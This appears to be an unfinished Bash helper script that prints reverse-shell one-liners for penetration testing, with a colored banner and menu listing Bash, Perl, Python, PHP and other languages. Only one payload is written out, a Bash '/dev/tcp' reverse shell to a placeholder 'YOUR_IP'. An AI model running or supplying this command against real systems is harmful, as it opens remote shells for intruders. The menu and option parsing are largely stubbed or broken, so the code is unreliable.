#!/usr/bin/env bash

# Made by Nicolas Morales Aka - Harrizzon

export DEBIAN_FRONTEND=noninteractive

# Colors

green="\e[0;32m\033[1m"
end="\033[0m\e[0m"
red="\e[0;31m\033[1m"
blue="\e[0;34m\033[1m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquois="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
bold="\e[1m"


# SALIR
trap ctrl_c INT

function ctrl_c(){
    clear
    echo -e "\n${red}${bold}[!]${end}${yellow}Saliendo...${end}${red}${bold}[!]${end}";sleep 0.2
    echo -e "${white}Gracias por utilizar ${cyan}${bold}RSCS"
    2>/dev/null
    exit 0

}

function banner(){
    echo -e "${turquois}
            ____  _____ ___________
           / __ \/ ___// ____/ ___/
          / /_/ /\__ \/ /    \__ \ 
         / _, _/___/ / /___ ___/ / 
        /_/ |_|/____/\____//____/   
        ${end}"
    echo -e "\t   ${red}>${end}${purple} By: ${end}${yellow}Harrizzon${end}${red} ! <${end}\n"
}


# HELP

function Help(){
   # Display Help
   echo
   echo -e "Syntax: ${bold}./rscs${end} ${green}[-help|menu|b|p|py|php|r|nc|j|g|pow]${end}"
   echo -e "\nOpciones:\n"
   echo -e "${green}menu${end}     Menu Interactivo."
   echo -e "${green}h${end}        Muestra este panel de ayuda."
   echo -e "${green}b${end}        Muestra reverse shells en ${green}BASH${end}."
   echo -e "${green}p${end}        Muestra reverse shells en ${green}PERL${end}."
   echo -e "${green}py${end}       Muestra reverse shells en ${green}PYTHON${end}."
   echo -e "${green}php${end}      Muestra reverse shells en ${green}PHP${end}."
   echo -e "${green}r${end}        Muestra reverse shells en ${green}RUBY${end}."
   echo -e "${green}j${end}        Muestra reverse shells en ${green}JAVA${end}."
   echo -e "${green}g${end}        Muestra reverse shells en ${green}GO${end}."
   echo -e "${green}pow${end}      Muestra reverse shells en ${green}POWERSHELL${end}."
   echo
}

# MAIN
function menu(){
    
    clear;
    echo -e "\n${green} [>] Iniciando... [<]${end}";sleep 1;
    clear
    opt=0
    
    while [ $opt = 0 ]
    do
        banner
        echo -e "${turquois}1)${end}${yellow} Bash reverse shells${end}"
        echo -e "${turquois}2)${end}${yellow} Perl reverse shells${end}"
        echo -e "${turquois}3)${end}${yellow} Python reverse shells${end}"
        echo -e "${turquois}4)${end}${yellow} PHP reverse shells${end}"
        echo -e "${turquois}5)${end}${yellow} RUBY reverse shells${end}"
        echo -e "${turquois}6)${end}${yellow} JAVA reverse shells${end}"
        echo -e "${turquois}7)${end}${yellow} GO reverse shells${end}"
        echo -e "${turquois}8)${end}${yellow} Powershell reverse shells${end}"
        read opc
        case $opc in
            #1)
            #2)
            #3)
            #4)
            #5)
            #6)
            #7)
            #8)
            *) echo -e "${red}[!]${end} Seleccione una opcion valida ${red}[!]${end}";sleep 1.2; clear
        esac

    done
    
}

function bashm(){
    clear
    echo -e "${green}bash -i >& /dev/tcp/${red}YOUR_IP${end}/${red}YOUR_PORT${end} 0>&1${end}"

}

# FLUJO

declare -i cont=0;
tput civs; while getopts ":h:m:b:p:py:php:r:nc:j:g:pow:" option; do
    case $option in
        m) menu=$OPTARG && let cont+=1 ;;
        b) bash=$OPTARG && let cont+=1 ;;
        h) Help;;

    esac
done

if [ $cont -ne 1 ]; then
    Help    
else
    menu
    bashm
    tput cnorm;

fi

